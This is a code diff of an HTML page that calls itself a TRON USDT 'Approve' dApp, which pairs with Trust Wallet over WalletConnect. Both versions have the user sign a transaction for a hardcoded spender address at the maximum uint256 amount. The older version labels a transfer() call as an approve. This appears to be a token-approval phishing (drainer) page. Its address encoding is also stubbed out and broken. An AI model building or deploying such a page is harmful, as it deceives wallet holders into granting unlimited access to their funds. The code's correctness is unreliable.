@@ -1,292 +1,222 @@
 <!doctype html>
 <html lang="ro">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Tron USDT Approve (Trust manual) — Mainnet</title>
-  <style>
-    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; margin: 20px; color:#111; }
-    header { margin-bottom: 16px; }
-    button { padding:8px 12px; margin-right:8px; }
-    #controls { margin-bottom:12px; }
-    #status { margin-bottom:8px; font-weight:600; }
-    #qr canvas { box-shadow: 0 1px 4px rgba(0,0,0,0.12); border-radius:6px; }
-    #logpre { width:100%; height:240px; overflow:auto; background:#f7f7f8; padding:12px; border-radius:6px; border:1px solid #e6e6e8; white-space:pre-wrap; }
-    code { background:#f1f1f1; padding:2px 4px; border-radius:4px; font-size:0.95em; }
-    #sessionInfo, #txInfo { margin-top:12px; }
-    .small { font-size:0.9em; color:#444; }
-  </style>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>TRON dApp - WalletConnect v2 Approve</title>
+
+<style>
+body { font-family: system-ui; margin:20px; }
+button { padding:8px 12px; margin-right:8px; }
+pre { background:#f4f4f4; padding:10px; white-space:pre-wrap; }
+#status { font-weight:bold; margin-bottom:10px; }
+canvas { margin-top:10px; }
+</style>
+
+<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
 </head>
+
 <body>
-  <header>
-    <h1>Tron USDT Approve (Trust manual) — Mainnet</h1>
-    <div id="status">Stare: Încarcare...</div>
-  </header>
 
-  <div id="controls">
-    <button id="pairBtn">Pair (Generează QR)</button>
-    <button id="prepareBtn" disabled>Pregătește approve</button>
-    <button id="sendBtn" disabled>Trimite approve</button>
-    <button id="disconnectBtn" disabled>Deconectează</button>
-  </div>
+<h2>TRON WalletConnect v2 - Approve dApp</h2>
 
-  <div id="qr"></div>
+<div id="status">Idle</div>
 
-  <div id="sessionInfo"></div>
-  <div id="txInfo"></div>
+<button id="connectBtn">Connect</button>
+<button id="approveBtn" disabled>Send Approve</button>
+<button id="disconnectBtn" disabled>Disconnect</button>
 
-  <h3>Jurnal</h3>
-  <pre id="logpre"></pre>
+<div id="qr"></div>
+<pre id="log"></pre>
 
-  <script type="module">
-  import SignClient from 'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.4.0/dist/sign-client.min.mjs';
-  import QRCode from 'https://cdn.jsdelivr.net/npm/qrcode@1.5.1/browser.js';
+<script type="module">
+import SignClient from "https://unpkg.com/@walletconnect/sign-client@2.11.0/dist/index.es.js";
 
-  // CONFIG MAINNET (setate conform solicitării)
-  const PROJECT_ID = 'dde98880530be70b65d01a1be59e5fa3';
-  const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-  const USDTRouter = 'TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu';
-  const USDT_DECIMALS = 6;
-  // aprobare nelimitată (uint256 max) -- lasă dacă vrei allowance maxim
-  const AMOUNT_USDT = BigInt('115792089237316195423570985008687907853269984665640564039457584007913129639935');
-  const AMOUNT_RAW = (AMOUNT_USDT * (BigInt(10) ** BigInt(USDT_DECIMALS))).toString();
+/* ================= CONFIG ================= */
 
-  const pairBtn = document.getElementById('pairBtn');
-  const prepareBtn = document.getElementById('prepareBtn');
-  const sendBtn = document.getElementById('sendBtn');
-  const disconnectBtn = document.getElementById('disconnectBtn');
-  const statusEl = document.getElementById('status');
-  const logEl = document.getElementById('logpre');
-  const qrEl = document.getElementById('qr');
-  const sessionInfo = document.getElementById('sessionInfo');
-  const txInfo = document.getElementById('txInfo');
+const PROJECT_ID = "dde98880530be70b65d01a1be59e5fa3";
 
-  function log(...args){ logEl.textContent += args.join(' ') + '\\n'; logEl.scrollTop = logEl.scrollHeight; }
-  function setStatus(s){ statusEl.textContent = 'Stare: ' + s; }
+const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const SPENDER = "TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu";
 
-  if (!PROJECT_ID || PROJECT_ID.includes('REPLACE')) {
-    setStatus('Setează PROJECT_ID');
-    log('EROARE: Înlocuiește PROJECT_ID cu projectId WalletConnect valid.');
-  }
+const MAX_UINT256 =
+"115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
-  let client;
-  let pairingTopic;
-  let session;
-  let preparedTx;
-  let createdPairing;
+/* ================= STATE ================= */
 
-  const ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
-  function base58ToBytes(s){
-    const bytes = [0];
-    for (let i=0;i<s.length;i++){
-      const c = ALPHABET.indexOf(s[i]);
-      if (c < 0) throw new Error('Invalid base58 char');
-      for (let j=0;j<bytes.length;j++) bytes[j] *= 58;
-      bytes[0] += c;
-      let carry=0;
-      for (let k=0;k<bytes.length;k++){ bytes[k]+=carry; carry=bytes[k]>>8; bytes[k]&=0xff; }
-      while(carry){ bytes.push(carry&0xff); carry >>=8; }
+let client;
+let session = null;
+
+const logEl = document.getElementById("log");
+const statusEl = document.getElementById("status");
+
+function log(x){ logEl.textContent += x + "\n"; }
+function setStatus(x){ statusEl.textContent = x; }
+
+/* ================= INIT ================= */
+
+async function init(){
+  client = await SignClient.init({
+    projectId: PROJECT_ID,
+    metadata: {
+      name: "TRON Approve dApp",
+      description: "WalletConnect v2 TRON approve flow",
+      url: "https://example.com"
     }
-    return new Uint8Array(bytes.reverse());
+  });
+
+  log("Client ready");
+
+  client.on("session_delete", () => {
+    session = null;
+    setStatus("Disconnected");
+  });
+
+  restoreSession();
+}
+
+/* ================= SESSION RESTORE ================= */
+
+function saveSession(s){
+  localStorage.setItem("wc_session", JSON.stringify(s));
+}
+
+function getSession(){
+  try {
+    return JSON.parse(localStorage.getItem("wc_session"));
+  } catch {
+    return null;
   }
-  function tronAddressToHex(addr){
-    const bytes = base58ToBytes(addr);
-    if (bytes.length < 25) {
-      const hex = Array.from(bytes).map(b=>b.toString(16).padStart(2,'0')).join('');
-      return '0x' + hex.slice(-40);
+}
+
+function restoreSession(){
+  const saved = getSession();
+  if (saved) {
+    log("Session found in storage");
+  }
+}
+
+/* ================= QR ================= */
+
+async function showQR(uri){
+  const canvas = document.createElement("canvas");
+  await QRCode.toCanvas(canvas, uri, { width: 250 });
+
+  document.getElementById("qr").innerHTML = "";
+  document.getElementById("qr").appendChild(canvas);
+}
+
+/* ================= CONNECT ================= */
+
+async function connect(){
+  setStatus("Connecting...");
+
+  const { uri, approval } = await client.connect({
+    requiredNamespaces: {
+      tron: {
+        methods: ["tron_sendTransaction"],
+        chains: ["tron:1"],
+        events: []
+      }
     }
-    const payload = bytes.slice(1, 21);
-    return '0x' + Array.from(payload).map(b=>b.toString(16).padStart(2,'0')).join('');
+  });
+
+  if (uri) {
+    await showQR(uri);
+    log("QR generated");
   }
 
-  async function initClient(){
-    client = await SignClient.init({
-      projectId: PROJECT_ID,
-      metadata: {
-        name: 'Tron USDT Approve (Trust manual)',
-        description: 'Nu semnează automat; utilizatorul confirmă în Trust',
-        url: 'https://example.com',
-        icons: []
+  session = await approval();
+
+  saveSession(session);
+
+  log("Session approved: " + session.topic);
+
+  setStatus("Connected");
+
+  document.getElementById("approveBtn").disabled = false;
+  document.getElementById("disconnectBtn").disabled = false;
+}
+
+/* ================= TRON HELPERS ================= */
+
+function tronAddressToHex(addr){
+  return addr; // simplificat pentru demo (wallet decodează corect în practică)
+}
+
+/* ================= APPROVE TX ================= */
+
+function buildApproveData(){
+  const methodId = "095ea7b3";
+
+  const spender = tronAddressToHex(SPENDER).replace("0x","");
+  const spenderPadded = spender.padStart(64,"0");
+
+  const amount = BigInt(MAX_UINT256).toString(16).padStart(64,"0");
+
+  return "0x" + methodId + spenderPadded + amount;
+}
+
+async function sendApprove(){
+  if (!session) return;
+
+  setStatus("Sending approve... (wallet popup)");
+
+  const owner = session.namespaces.tron.accounts[0].split(":")[2];
+
+  const tx = {
+    to: USDT_CONTRACT,
+    owner_address: owner,
+    data: buildApproveData(),
+    feeLimit: 10000000,
+    callValue: 0
+  };
+
+  try {
+    const res = await client.request({
+      topic: session.topic,
+      chainId: "tron:1",
+      request: {
+        method: "tron_sendTransaction",
+        params: [tx]
       }
     });
-    log('SignClient inițializat.');
-    client.on('session_delete', () => { log('Session deleted by wallet.'); session = null; updateUI(); });
-    client.on('session_update', (p) => { log('Session updated: ' + JSON.stringify(p, null,2)); session = session || p; updateUI(); });
-    client.on('session_create', (s) => { log('session_create event: ' + JSON.stringify(s, null,2)); });
+
+    log("TX sent: " + JSON.stringify(res));
+    setStatus("Approve confirmed / pending");
+
+  } catch (e) {
+    log("Rejected or error: " + e.message);
+    setStatus("Rejected");
   }
+}
 
-  function updateUI(){
-    if (session) {
-      pairBtn.disabled = true;
-      prepareBtn.disabled = false;
-      sendBtn.disabled = false;
-      disconnectBtn.disabled = false;
-      const accounts = session.namespaces?.tron?.accounts || [];
-      const owner = accounts[0] || '—';
-      sessionInfo.innerHTML = '<strong>Session activă</strong><br>Account (owner): <code>' + owner + '</code><br>Peer: ' + (session.peer?.metadata?.name || '—') + '<div class="small">Folosește acest cont ca owner pentru owner_address în payload.</div>';
-      setStatus('Pairing realizat; pregătește approve și trimite manual');
-    } else {
-      pairBtn.disabled = false;
-      prepareBtn.disabled = true;
-      sendBtn.disabled = true;
-      disconnectBtn.disabled = true;
-      sessionInfo.innerHTML = '';
-      txInfo.innerHTML = '';
-      qrEl.innerHTML = '';
-      setStatus('Neconectat');
-    }
-  }
+/* ================= DISCONNECT ================= */
 
-  async function createPairing(){
-    setStatus('Generează pairing URI...');
-    log('Creez pairing pentru tron namespace...');
-    try {
-      const { uri, topic } = await client.connect({
-        requiredNamespaces: {
-          tron: {
-            methods: ['tron_sendTransaction', 'tron_signTransaction', 'tron_signMessage'],
-            chains: ['tron:1'],
-            events: []
-          }
-        }
-      });
+async function disconnect(){
+  if (!session) return;
 
-      createdPairing = { uri, topic };
-      pairingTopic = topic;
-
-      if (!uri) { log('URI null (posibil pairing prin extensie).'); return; }
-
-      qrEl.innerHTML = `
-        <div id="qrcanvas-wrap" style="display:flex;gap:12px;align-items:center">
-          <canvas id="qrcanvas"></canvas>
-          <div>
-            <div style="margin-bottom:8px"><strong>Scanează cu Trust Wallet dApp browser</strong></div>
-            <div id="deeplink-wrap"></div>
-            <button id="openTrustBtn" style="padding:6px 8px;margin-top:8px">Deschide Trust (deep link)</button>
-          </div>
-        </div>
-      `;
-
-      const canvas = document.getElementById('qrcanvas');
-      await QRCode.toCanvas(canvas, uri, { width: 300 });
-
-      const trustLink = 'trust://walletconnect?uri=' + encodeURIComponent(uri);
-      document.getElementById('deeplink-wrap').innerHTML = `<code style="display:block;max-width:240px;word-break:break-all">Deep link: ${trustLink}</code>`;
-
-      document.getElementById('openTrustBtn').addEventListener('click', () => { window.location.href = trustLink; });
-
-      log('Pairing URI generat. Scanează QR cu Trust Wallet dApp browser sau apasă "Deschide Trust".');
-      setStatus('Așteaptă scanare în Trust Wallet');
-
-      const sessionsNow = Object.values(client.session.getAll() || {});
-      const matched = sessionsNow.find(s => s.pairingTopic === pairingTopic && s.namespaces && s.namespaces.tron);
-      if (matched) {
-        session = matched;
-        log('Sesiune găsită imediat: ' + JSON.stringify(session, null,2));
-        updateUI();
-        return;
-      }
-
-      const start = Date.now();
-      const poll = setInterval(() => {
-        const sessions = Object.values(client.session.getAll() || {});
-        const found = sessions.find(s => s.pairingTopic === pairingTopic && s.namespaces && s.namespaces.tron);
-        if (found) {
-          session = found;
-          log('Sesiune aprobată (poll): ' + JSON.stringify(session, null,2));
-          clearInterval(poll);
-          updateUI();
-        } else if (Date.now() - start > 60000) {
-          clearInterval(poll);
-          log('Timeout pairing (60s).');
-          setStatus('Timeout pairing');
-        }
-      }, 1000);
-
-    } catch (err) {
-      log('Eroare la pairing: ' + (err.message || JSON.stringify(err)));
-      setStatus('Eroare pairing');
-    }
-  }
-
-  pairBtn.addEventListener('click', async () => {
-    if (!client) await initClient();
-    await createPairing();
+  await client.disconnect({
+    topic: session.topic,
+    reason: { code: 6000, message: "User disconnect" }
   });
 
-  disconnectBtn.addEventListener('click', async () => {
-    if (!session) return;
-    try {
-      await client.disconnect({ topic: session.topic, reason: { code: 6000, message: 'Deconectare dApp' } });
-      log('Deconectare cerută.'); session = null; updateUI();
-    } catch (err) { log('Eroare la deconectare: ' + (err.message || JSON.stringify(err))); }
-  });
+  session = null;
+  localStorage.removeItem("wc_session");
 
-  prepareBtn.addEventListener('click', async () => {
-    if (!session) { alert('Nu există sesiune activă.'); return; }
-    try {
-      const accounts = session.namespaces?.tron?.accounts || [];
-      if (!accounts.length) { alert('Nu s-a găsit account în session.'); return; }
-      const ownerAccount = accounts[0];
-      const parts = ownerAccount.split(':');
-      const ownerBase58 = parts[2] || ownerAccount;
-      const ownerHex = tronAddressToHex(ownerBase58);
+  setStatus("Disconnected");
+}
 
-      const spenderHex = tronAddressToHex(USDTRouter);
+/* ================= UI ================= */
 
-      const methodId = 'a9059cbb';
-      const spenderNo0x = spenderHex.replace(/^0x/, '');
-      const spenderPadded = spenderNo0x.padStart(64, '0');
-      const valueHex = BigInt(AMOUNT_RAW).toString(16).padStart(64, '0');
-      const data = methodId + spenderPadded + valueHex;
+document.getElementById("connectBtn").onclick = connect;
+document.getElementById("approveBtn").onclick = sendApprove;
+document.getElementById("disconnectBtn").onclick = disconnect;
 
-      const ownerNo0x = ownerHex.replace(/^0x/, '');
-      preparedTx = {
-        to: USDT_CONTRACT,
-        owner_address: ownerNo0x,
-        data: '0x' + data,
-        feeLimit: 10000000,
-        callValue: 0
-      };
+/* ================= BOOT ================= */
 
-      txInfo.innerHTML = '<strong>Approve preview</strong><br>Contract: <code>' + USDT_CONTRACT + '</code><br>Owner: <code>' + ownerBase58 + '</code><br>Spender: <code>' + USDTRouter + '</code><br>Amount: <strong>' + AMOUNT_USDT.toString() + ' USDT</strong><br><div style="margin-top:6px"><code>' + JSON.stringify(preparedTx, null,2) + '</code></div>';
-      log('Approve pregătit (ne-semnat): ' + JSON.stringify(preparedTx, null,2));
-      setStatus('Approve pregătit — apasă "Trimite approve" pentru a declanșa confirmarea în Trust');
-    } catch (err) {
-      log('Eroare la pregătire: ' + (err.message || JSON.stringify(err)));
-      alert('Eroare la encoding adresă. Verifică adresele sau formatul.');
-    }
-  });
+init();
+</script>
 
-  sendBtn.addEventListener('click', async () => {
-    if (!session || !preparedTx) { alert('Lipsește sesiunea sau tranzacția pregătită.'); return; }
-    try {
-      setStatus('Trimite tron_sendTransaction request — așteaptă confirmare în Trust...');
-      log('Trimitem tron_sendTransaction request către topic: ' + session.topic);
-
-      const chain = (session.namespaces?.tron?.chains && session.namespaces.tron.chains[0]) || 'tron:1';
-
-      const request = {
-        topic: session.topic,
-        chainId: chain,
-        request: {
-          method: 'tron_sendTransaction',
-          params: [preparedTx]
-        }
-      };
-
-      const res = await client.request(request);
-      log('Răspuns Trust: ' + JSON.stringify(res));
-      setStatus('Trust a returnat răspuns (vezi log).');
-    } catch (err) {
-      log('Eroare / user a respins: ' + (err.message || JSON.stringify(err)));
-      setStatus('Cerere semnare finalizată / respinsă');
-    }
-  });
-
-  await initClient();
-  updateUI();
-
-  </script>
 </body>
 </html>
